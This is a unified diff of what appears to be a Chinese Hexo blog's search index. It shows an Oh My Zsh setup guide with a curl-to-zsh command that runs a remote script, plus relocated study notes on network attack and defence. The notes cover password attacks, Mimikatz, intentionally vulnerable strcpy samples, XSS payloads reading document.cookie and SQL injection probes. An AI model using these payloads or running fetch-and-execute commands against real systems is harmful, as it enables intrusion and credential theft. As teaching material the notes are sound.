-<h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p>
-<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p>
-<ul>
-<li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li>
-<li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li>
-</ul>
-<h3 id="自定义插件和主题"><a href="#自定义插件和主题" class="headerlink" title="自定义插件和主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-plugins-and-themes"></a>自定义插件和主题</h3><p>如果要覆盖任何默认行为，只需在目录中添加一个新文件（以 结尾）。<code>.zsh``custom/</code></p>
-<p>如果您有许多功能可以很好地组合在一起，则可以将它们作为文件放在目录中，然后启用此插件。<code>XYZ.plugin.zsh``custom/plugins/</code></p>
-<p>如果要覆盖使用 Oh My Zsh 分发的插件的功能，请在目录中创建一个同名的插件，该插件将被加载，而不是 .<code>custom/plugins/``plugins/</code></p>
-<h2 id="获取更新"><a href="#获取更新" class="headerlink" title="获取更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-updates"></a>获取更新</h2><p>默认情况下，系统将提示您每 2 周检查一次更新。您可以在<strong>加载Oh My Zsh之前</strong>，通过向文件添加一行来选择其他更新模式：<code>~/.zshrc</code></p>
-<ol>
-<li><p>自动更新，无确认提示：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode auto</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如果有可用的更新，只需每隔几天提供一次提醒：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode reminder</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>要完全禁用自动更新：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>注意：您可以使用以下设置控制 Oh My Zsh 检查更新的频率：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every 7 days</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">This will check <span class="keyword">for</span> updates every time you open the terminal (not recommended)</span></span><br><span class="line">zstyle &#x27;:omz:update&#x27; frequency 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-updates"></a>手动更新</h3><p>如果你想在任何时间点更新（也许有人刚刚发布了一个新插件，你不想等一个星期？），你只需要运行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">omz update</span><br></pre></td></tr></table></figure>
-
-<p>魔法！🎉</p>
-<h2 id="卸载-Oh-My-Zsh"><a href="#卸载-Oh-My-Zsh" class="headerlink" title="卸载 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#uninstalling-oh-my-zsh"></a>卸载 Oh My Zsh</h2><p>哦，我的Zsh并不适合所有人。我们会想念你的，但我们想让这很容易分手。</p>
-<p>如果要卸载 ，只需从命令行运行即可。它将删除自身并还原以前的配置或配置。<code>oh-my-zsh``uninstall_oh_my_zsh``bash``zsh</code></p>
-<h2 id="【推荐】国内脚本配置安装"><a href="#【推荐】国内脚本配置安装" class="headerlink" title="【推荐】国内脚本配置安装"></a>【推荐】国内脚本配置安装</h2><p>考虑到官方方法，需要连接GitHub；如果你的设备无法有效访问GitHub。可以使用我配置的脚本：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -fsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-<p>为了保证脚本能顺利运行，你的Linux&#x2F;Mac服务器需要：</p>
-<blockquote>
-<p>提前安装curl、unzip,如果有~&#x2F;.zshrc文件，最好提前备份，否则本脚本自动更改原本的.zshrc文件为zshrcBak</p>
-</blockquote>
 ]]></content>
       <categories>
         <category>SHELL</category>
@@ -3826,234 +3826,6 @@
       </tags>
   </entry>
   <entry>
-    <title>网络攻防技术</title>
-    <url>/2022/03/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h1 id="三、口令攻击"><a href="#三、口令攻击" class="headerlink" title="三、口令攻击"></a>三、口令攻击</h1><ol>
-<li><h2 id="针对口令强度的攻击（弱口令攻击）"><a href="#针对口令强度的攻击（弱口令攻击）" class="headerlink" title="针对口令强度的攻击（弱口令攻击）"></a>针对口令强度的攻击（弱口令攻击）</h2><ol>
-<li>穷举法（暴破）</li>
-<li>字典攻击</li>
-<li>社工<ol start="4">
-<li>组合攻击</li>
-<li>撞库攻击</li>
-</ol>
-</li>
-<li>彩虹表破解：破解哈希算法（主用于MD5、HASH等）<ul>
-<li>原理：基于内存 - 时间衡量方法，通过以一定存储空间换取时间的方式，提高对散列值的破解效率</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li>windows远程口令猜解<ol>
-<li>基于IPC的远程口令猜解（IPC$文件和打印机共享：139、445） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\目标主机IP\ipc$ &quot;口令&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></li>
-<li>基于Thrminal Service的远程口令猜解（DRP服务：3389）</li>
-</ol>
-</li>
-</ul>
-</li>
-<li><h2 id="针对口令存储的攻击"><a href="#针对口令存储的攻击" class="headerlink" title="针对口令存储的攻击"></a>针对口令存储的攻击</h2><ol>
-<li>缓存口令<ul>
-<li>实现原理：在进行用户身份验证时，需要将口令配置加载到<strong>内存</strong>中，通过对内存读取</li>
-<li>相关工具：PWDump、Mimikatz</li>
-</ul>
-</li>
-<li>口令文件<ul>
-<li>口令通过文件形式进行存放在系统中，对文件进行破解</li>
-<li>相关实例：<ol>
-<li>windows账号和口令存放在SAM文件（C:\Windows\System32\config）</li>
-<li>Linux账号和口令存放在Shadow文件</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>口令的其他存储位置<ul>
-<li>（除了缓存和文件）存放其他位置：注册表、（及时口令）casch或内存、硬盘扇区、（主板BIOS存放位置）COMS</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li>NTLM加密机制：<ol>
-<li>口令转换成Unicode编码</li>
-<li>MD算法对Unicode编码进行散列，得到128比特的散列结果，成为NTLM散列</li>
-</ol>
-<ul>
-<li>CR方式：“挑战&#x2F;响应”方式（服务器对挑战数据没有时效性要求，可以进行重放攻击）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h2 id="针对口令传输的攻击"><a href="#针对口令传输的攻击" class="headerlink" title="针对口令传输的攻击"></a>针对口令传输的攻击</h2><ol>
-<li>口令嗅探</li>
-<li>键盘记录</li>
-<li>网络钓鱼</li>
-<li>重放攻击：（通信双方按照特定协议）嗅探当前通信流量，在适当的时候重发给通信的其中一方，达到欺骗目的。<ol>
-<li>简单重放</li>
-<li>反向重放：向消息发送者重放数据</li>
-</ol>
-<ul>
-<li>SMB协议（共享文件、打印机、通信对象之间资源）发展：明文 &#x3D;&#x3D;&gt; LM验证机制（LAN Manager Callenge Response） &#x3D;&#x3D;&gt; NTLM验证机制（Windows NT Challenge Response）<h1 id="四、软件漏洞"><a href="#四、软件漏洞" class="headerlink" title="四、软件漏洞"></a>四、软件漏洞</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="漏洞标准化研究"><a href="#漏洞标准化研究" class="headerlink" title="漏洞标准化研究"></a>漏洞标准化研究</h2><ol>
-<li>CVE：Common Vulnerabilities &amp; Exposures<ul>
-<li>漏洞字典：漏洞对应CVE编号</li>
-</ul>
-</li>
-<li>CWE：Common Weakness Enumeration<ul>
-<li>CWE是一种包括类缺陷、基础缺陷、变种缺陷等多层次的体系<ol>
-<li>字典视图：以字母表顺序排列</li>
-<li>开发视图：针对软件开发者，以软件开发周期为参照分类</li>
-<li>研究视图：这对学术界人士，从内在性质等方面分类</li>
-</ol>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><h2 id="典型漏洞类型"><a href="#典型漏洞类型" class="headerlink" title="典型漏洞类型"></a>典型漏洞类型</h2><ol>
-<li>栈溢出<ul>
-<li>1986年首次出现真实攻击</li>
-<li>进程使用系统内存从低到高四结构：栈、堆、数据段、文本（代码）段</li>
-<li>栈空间是程序设计时规定好如何使用以及使用多少的内存空间（典型栈变量包括函数内部的普通变量、数组等）</li>
-<li>栈帧（stack Frame）：每个进程有一个栈，这个进程中每个函数被调用时分别再栈中占用一段区域</li>
-<li>原理分析示例  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(name,argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,name);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>堆溢出<ul>
-<li>堆结构特点<ol>
-<li>堆是程序运行时动态分配的内存（指不预先决定，需要参考用户反馈）</li>
-<li>堆使用时需要程序员使用专用函数申请（如：C：malloc() ; C++：new()）</li>
-<li>一般一个堆指针来使用申请的内存，读写释放都通过这个指针完成</li>
-<li>使用完毕后要通过释放函数回收内存，否则会造成内存泄漏（free() ; delete() ）</li>
-</ol>
-</li>
-<li>现代操作系统的堆结构：<ol>
-<li>堆块：堆区内存按不同大小组织成块，以堆块为单元进行标识，而不是传统字节标识<ul>
-<li>块首：一个堆块头部的几个字节，用来标识这个块首自身信息。</li>
-<li>块身：紧跟在块首后面部分，最终分配给用户使用的数据区。</li>
-</ul>
-</li>
-<li>堆表：一般位于堆区起始位置，用于检索堆区中所有堆块的重要信息，包括堆块的位置、大小、空闲或占用等。</li>
-</ol>
-</li>
-<li>原理分析示例：  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFSIZE 32</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buf1;</span><br><span class="line">	buf1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(BUFFSIZE);	<span class="comment">//分配内存块</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf1,argv[<span class="number">1</span>]);	<span class="comment">//向buf1拷贝参数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf1);	<span class="comment">//打印buf1</span></span><br><span class="line">	<span class="built_in">free</span>(buf1);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>堆溢出攻击思路<ol>
-<li>构造数据溢出下一个堆块的块首</li>
-<li>改写块首的前向指针和后向指针</li>
-<li>分配、释放、合并等操作发生时获得一次向内存任意地址读写任意数据的机会</li>
-</ol>
-</li>
-</ul>
-</li>
-<li>格式化串漏洞<ul>
-<li>格式化串：在print系列函数中按照一定的格式对数据进行输出（既可输出到标准输出，也可输出到文件句柄、字符串等）</li>
-<li>格式化串漏洞原理：软件使用格式化字符串为参数，且该格式化字符串来自外部输入<ul>
-<li>输入格式化字符串参数”%n”：『将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置』</li>
-<li>“%p”</li>
-</ul>
-</li>
-<li>优势：只要构造出指针就可以修盖内存中任何数值，攻击具有针对性。（栈溢出：地毯式轰炸）</li>
-</ul>
-</li>
-<li>整型溢出<ol>
-<li>存储溢出</li>
-<li>运算溢出</li>
-<li>符号溢出</li>
-</ol>
-</li>
-<li>（UAF）释放再使用</li>
-</ol>
-</li>
-<li><h2 id="溢出漏洞利用原理"><a href="#溢出漏洞利用原理" class="headerlink" title="溢出漏洞利用原理"></a>溢出漏洞利用原理</h2></li>
-<li><h2 id="漏洞利用保护机制"><a href="#漏洞利用保护机制" class="headerlink" title="漏洞利用保护机制"></a>漏洞利用保护机制</h2><h1 id="五、Web应用攻击"><a href="#五、Web应用攻击" class="headerlink" title="五、Web应用攻击"></a>五、Web应用攻击</h1><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;err&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
-<li>主要类型<ol>
-<li>反射型【非持久】：输入攻击脚本直接返回到被攻击者浏览器 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.example.com/test.php? </span></span><br><span class="line">user=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>	<span class="comment">//通过传递变量缺乏过滤进行执行</span></span><br></pre></td></tr></table></figure></li>
-<li>存储型【持久】：（一般用于论坛留言，评论，日志）将攻击脚本存储于服务器，受害者查看页面时执行</li>
-<li>DOM型（文档对象模型）：针对web中的JavaScript代码的逻辑漏洞而执行攻击脚本</li>
-</ol>
-</li>
-<li>常用利用方法<ol>
-<li>Cookie窃取 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;<span class="regexp">/script&gt;	/</span><span class="regexp">/visit:document.cookie to GetCookie</span></span><br></pre></td></tr></table></figure></li>
-<li>会话劫持</li>
-<li>钓鱼：通过执行JavaScript代码动态生成页面内容或直接注入HTML代码（比传统钓鱼更具隐蔽性）</li>
-<li>信息刺探：访问并窃取历史信息、端口信息、剪切板、IP、键盘信息等request对象</li>
-<li>网页挂马</li>
-<li>xss蠕虫：一般用存储型将恶意代码保存于服务器<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2></li>
-</ol>
-</li>
-<li>注入条件：<ul>
-<li>用户能够控制输入</li>
-<li>原本程序要执行的sql语句，拼接了用户输入数据</li>
-</ul>
-</li>
-<li>常用SQL注入<ol>
-<li>Mysql <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名 from 表名 where 条件 order by i limit m.n /*select一般语句*/</span><br></pre></td></tr></table></figure></li>
-<li>php程序调用函数执行sql语句功能 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx? id=&quot;select * from users where id=$id and pass=&#x27;&quot;.$pass.&quot;&#x27;&quot;; &amp;pwd=</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li>注入类型分类<ol>
-<li>按注入点类型<ol>
-<li>数字型（整型）<ul>
-<li>注入点类型为数字（整型），不需要使用引号闭合 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;9 or 1=1 --&quot;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>字符型<ul>
-<li>一般需要使用引号（单、双）满足sql语句引号闭合语法要求  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;xx&#x27; or 1=1 --&quot;  --&quot;xx&quot;：任意值 ; &quot;--&quot;：注释符</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>搜索型</li>
-</ol>
-</li>
-<li>按注入技术（执行效果）分类<ol>
-<li>基于布尔的盲注<ul>
-<li>在输入值后拼接布尔表达式（真值为0或1），通过<strong>回显信息的不同</strong>判断，某个参数是否为注入点 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*1=1:真值为true*/</span><br><span class="line">id = 3005 and 1=1 &amp; pass= test</span><br><span class="line">/*1=2:真值为false*/</span><br><span class="line">id = 3005 and 1=2 &amp; pass= test</span><br><span class="line">/*若回显信息不同，则$id为注入点*/</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>基于时间的盲注<ul>
-<li>使用一些时间函数，如延迟函数slee() <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=3005 and sleep(3) &amp;pass=test</span><br><span class="line">/* web应用延迟3秒后显示登录失败，则$id注入点 */</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li>基于报错的注入<ul>
-<li>在php调用函数<code>？</code>后输入错误验证传递，观察错误信息中显示出的对应数据库函数，可判断数据库类型</li>
-</ul>
-</li>
-<li>联合查询注入</li>
-<li>堆查询注入</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>常用判断&#x2F;查找注入点<ol>
-<li>经典：<ul>
-<li>and 1&#x3D;1 </li>
-<li>and 2&gt;1 </li>
-<li>or 1&#x3D;1 </li>
-<li>or 1&lt;1</li>
-</ul>
-</li>
-<li>数据库函数：<ul>
-<li>and sleep(4)&#x3D;1 </li>
-<li>and length(user())&gt;3</li>
-</ul>
-</li>
-<li>特殊符号：<ul>
-<li>单引号（’）</li>
-<li>双引号（”）<h1 id="六、恶意代码"><a href="#六、恶意代码" class="headerlink" title="六、恶意代码"></a>六、恶意代码</h1><h1 id="七、假消息攻击"><a href="#七、假消息攻击" class="headerlink" title="七、假消息攻击"></a>七、假消息攻击</h1><h1 id="八、拒绝服务攻击"><a href="#八、拒绝服务攻击" class="headerlink" title="八、拒绝服务攻击"></a>八、拒绝服务攻击</h1><h1 id="九、防御"><a href="#九、防御" class="headerlink" title="九、防御"></a>九、防御</h1><h1 id="十、访问控制机制"><a href="#十、访问控制机制" class="headerlink" title="十、访问控制机制"></a>十、访问控制机制</h1><h1 id="十一、防火墙"><a href="#十一、防火墙" class="headerlink" title="十一、防火墙"></a>十一、防火墙</h1><h1 id="十二、网络安全监控"><a href="#十二、网络安全监控" class="headerlink" title="十二、网络安全监控"></a>十二、网络安全监控</h1><h1 id="十三、追踪溯源"><a href="#十三、追踪溯源" class="headerlink" title="十三、追踪溯源"></a>十三、追踪溯源</h1></li>
-</ul>
-</li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SWITCH &amp; ROUTER</title>
     <url>/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol>
@@ -4393,6 +4165,234 @@
       <tags>
         <tag>交换机</tag>
         <tag>路由器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络攻防技术</title>
+    <url>/2022/03/22/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h1 id="三、口令攻击"><a href="#三、口令攻击" class="headerlink" title="三、口令攻击"></a>三、口令攻击</h1><ol>
+<li><h2 id="针对口令强度的攻击（弱口令攻击）"><a href="#针对口令强度的攻击（弱口令攻击）" class="headerlink" title="针对口令强度的攻击（弱口令攻击）"></a>针对口令强度的攻击（弱口令攻击）</h2><ol>
+<li>穷举法（暴破）</li>
+<li>字典攻击</li>
+<li>社工<ol start="4">
+<li>组合攻击</li>
+<li>撞库攻击</li>
+</ol>
+</li>
+<li>彩虹表破解：破解哈希算法（主用于MD5、HASH等）<ul>
+<li>原理：基于内存 - 时间衡量方法，通过以一定存储空间换取时间的方式，提高对散列值的破解效率</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>windows远程口令猜解<ol>
+<li>基于IPC的远程口令猜解（IPC$文件和打印机共享：139、445） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\目标主机IP\ipc$ &quot;口令&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></li>
+<li>基于Thrminal Service的远程口令猜解（DRP服务：3389）</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><h2 id="针对口令存储的攻击"><a href="#针对口令存储的攻击" class="headerlink" title="针对口令存储的攻击"></a>针对口令存储的攻击</h2><ol>
+<li>缓存口令<ul>
+<li>实现原理：在进行用户身份验证时，需要将口令配置加载到<strong>内存</strong>中，通过对内存读取</li>
+<li>相关工具：PWDump、Mimikatz</li>
+</ul>
+</li>
+<li>口令文件<ul>
+<li>口令通过文件形式进行存放在系统中，对文件进行破解</li>
+<li>相关实例：<ol>
+<li>windows账号和口令存放在SAM文件（C:\Windows\System32\config）</li>
+<li>Linux账号和口令存放在Shadow文件</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>口令的其他存储位置<ul>
+<li>（除了缓存和文件）存放其他位置：注册表、（及时口令）casch或内存、硬盘扇区、（主板BIOS存放位置）COMS</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>NTLM加密机制：<ol>
+<li>口令转换成Unicode编码</li>
+<li>MD算法对Unicode编码进行散列，得到128比特的散列结果，成为NTLM散列</li>
+</ol>
+<ul>
+<li>CR方式：“挑战&#x2F;响应”方式（服务器对挑战数据没有时效性要求，可以进行重放攻击）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h2 id="针对口令传输的攻击"><a href="#针对口令传输的攻击" class="headerlink" title="针对口令传输的攻击"></a>针对口令传输的攻击</h2><ol>
+<li>口令嗅探</li>
+<li>键盘记录</li>
+<li>网络钓鱼</li>
+<li>重放攻击：（通信双方按照特定协议）嗅探当前通信流量，在适当的时候重发给通信的其中一方，达到欺骗目的。<ol>
+<li>简单重放</li>
+<li>反向重放：向消息发送者重放数据</li>
+</ol>
+<ul>
+<li>SMB协议（共享文件、打印机、通信对象之间资源）发展：明文 &#x3D;&#x3D;&gt; LM验证机制（LAN Manager Callenge Response） &#x3D;&#x3D;&gt; NTLM验证机制（Windows NT Challenge Response）<h1 id="四、软件漏洞"><a href="#四、软件漏洞" class="headerlink" title="四、软件漏洞"></a>四、软件漏洞</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="漏洞标准化研究"><a href="#漏洞标准化研究" class="headerlink" title="漏洞标准化研究"></a>漏洞标准化研究</h2><ol>
+<li>CVE：Common Vulnerabilities &amp; Exposures<ul>
+<li>漏洞字典：漏洞对应CVE编号</li>
+</ul>
+</li>
+<li>CWE：Common Weakness Enumeration<ul>
+<li>CWE是一种包括类缺陷、基础缺陷、变种缺陷等多层次的体系<ol>
+<li>字典视图：以字母表顺序排列</li>
+<li>开发视图：针对软件开发者，以软件开发周期为参照分类</li>
+<li>研究视图：这对学术界人士，从内在性质等方面分类</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="典型漏洞类型"><a href="#典型漏洞类型" class="headerlink" title="典型漏洞类型"></a>典型漏洞类型</h2><ol>
+<li>栈溢出<ul>
+<li>1986年首次出现真实攻击</li>
+<li>进程使用系统内存从低到高四结构：栈、堆、数据段、文本（代码）段</li>
+<li>栈空间是程序设计时规定好如何使用以及使用多少的内存空间（典型栈变量包括函数内部的普通变量、数组等）</li>
+<li>栈帧（stack Frame）：每个进程有一个栈，这个进程中每个函数被调用时分别再栈中占用一段区域</li>
+<li>原理分析示例  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(name,argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,name);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>堆溢出<ul>
+<li>堆结构特点<ol>
+<li>堆是程序运行时动态分配的内存（指不预先决定，需要参考用户反馈）</li>
+<li>堆使用时需要程序员使用专用函数申请（如：C：malloc() ; C++：new()）</li>
+<li>一般一个堆指针来使用申请的内存，读写释放都通过这个指针完成</li>
+<li>使用完毕后要通过释放函数回收内存，否则会造成内存泄漏（free() ; delete() ）</li>
+</ol>
+</li>
+<li>现代操作系统的堆结构：<ol>
+<li>堆块：堆区内存按不同大小组织成块，以堆块为单元进行标识，而不是传统字节标识<ul>
+<li>块首：一个堆块头部的几个字节，用来标识这个块首自身信息。</li>
+<li>块身：紧跟在块首后面部分，最终分配给用户使用的数据区。</li>
+</ul>
+</li>
+<li>堆表：一般位于堆区起始位置，用于检索堆区中所有堆块的重要信息，包括堆块的位置、大小、空闲或占用等。</li>
+</ol>
+</li>
+<li>原理分析示例：  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFSIZE 32</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buf1;</span><br><span class="line">	buf1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(BUFFSIZE);	<span class="comment">//分配内存块</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf1,argv[<span class="number">1</span>]);	<span class="comment">//向buf1拷贝参数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf1);	<span class="comment">//打印buf1</span></span><br><span class="line">	<span class="built_in">free</span>(buf1);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>堆溢出攻击思路<ol>
+<li>构造数据溢出下一个堆块的块首</li>
+<li>改写块首的前向指针和后向指针</li>
+<li>分配、释放、合并等操作发生时获得一次向内存任意地址读写任意数据的机会</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>格式化串漏洞<ul>
+<li>格式化串：在print系列函数中按照一定的格式对数据进行输出（既可输出到标准输出，也可输出到文件句柄、字符串等）</li>
+<li>格式化串漏洞原理：软件使用格式化字符串为参数，且该格式化字符串来自外部输入<ul>
+<li>输入格式化字符串参数”%n”：『将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置』</li>
+<li>“%p”</li>
+</ul>
+</li>
+<li>优势：只要构造出指针就可以修盖内存中任何数值，攻击具有针对性。（栈溢出：地毯式轰炸）</li>
+</ul>
+</li>
+<li>整型溢出<ol>
+<li>存储溢出</li>
+<li>运算溢出</li>
+<li>符号溢出</li>
+</ol>
+</li>
+<li>（UAF）释放再使用</li>
+</ol>
+</li>
+<li><h2 id="溢出漏洞利用原理"><a href="#溢出漏洞利用原理" class="headerlink" title="溢出漏洞利用原理"></a>溢出漏洞利用原理</h2></li>
+<li><h2 id="漏洞利用保护机制"><a href="#漏洞利用保护机制" class="headerlink" title="漏洞利用保护机制"></a>漏洞利用保护机制</h2><h1 id="五、Web应用攻击"><a href="#五、Web应用攻击" class="headerlink" title="五、Web应用攻击"></a>五、Web应用攻击</h1><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;err&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+<li>主要类型<ol>
+<li>反射型【非持久】：输入攻击脚本直接返回到被攻击者浏览器 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.example.com/test.php? </span></span><br><span class="line">user=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;123&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>	<span class="comment">//通过传递变量缺乏过滤进行执行</span></span><br></pre></td></tr></table></figure></li>
